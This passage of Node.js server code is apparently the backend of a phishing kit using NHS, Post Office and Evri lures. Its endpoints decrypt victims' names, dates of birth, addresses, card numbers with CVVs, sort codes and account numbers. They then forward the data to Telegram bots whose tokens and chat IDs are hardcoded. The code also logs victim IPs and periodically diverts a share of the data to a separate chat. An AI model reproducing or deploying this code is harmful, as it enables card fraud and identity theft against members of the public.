            mannyman789 += 1;
        }

        res.send("Update Completed");
    })
});

let mulligang135 = 0;

app.options('/mulligang135', cors())

app.post('/mulligang135',  apiLimiter, (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = `${req.body.userAgent}`;
    ip = `${req.body.ip}`;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (mulligang135 == 10) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            mulligang135 = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=NHSMulli:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1990774394&text=NHS:\n${originalText}`
            );
            mulligang135 += 1;
        }

        res.send("Update Completed");
    })
});

let lingypack = 0;

app.options('/lingypackNHS', cors())

app.post('/lingypackNHS',  apiLimiter, (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (lingypack == 10) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            lingypack = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=NHSLingz:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=5235839910&text=NHS:\n${originalText}`
            );
            lingypack += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/giveip', cors())

app.post('/giveip', (req, res) => {
    ip = req.body.ip;

    content = `${ip}\n`
    fs.appendFile('ips.txt', content, err => {

        res.send("Update Completed");

    })
});

//POSTOFFICE
//POSTOFFICE
//POSTOFFICE

app.options('/tCapz', cors())

app.post('/tCapz',  apiLimiter, (req, res) => {
    fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (lingypack == 10) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            lingypack = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=POTcapz:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1437456088&text=PO:\n${originalText}`
            );
            lingypack += 1;
        }

        res.send("Update Completed");
    })
});

//EVRI
//EVRI
//EVRI

app.options('/@skiii719', cors())

app.post('/@skiii719',  apiLimiter, (req, res) => {
    fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (skiii719 == 7) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            skiii719 = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=Evriskiii719:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=5334039930&text=Evri:\n${originalText}`
            );
            skiii719 += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/removeips', cors())

app.post('/removeips', (req, res) => {
    ip = req.body.ip;

    content = ``
    fs.writeFile('ips.txt', content, err => {
        if (err) {
            console.error(err);
        } else {
            res.send("Update Completed");
        }
    })
});

app.listen(port, () => console.log(`Started server at port ` + port));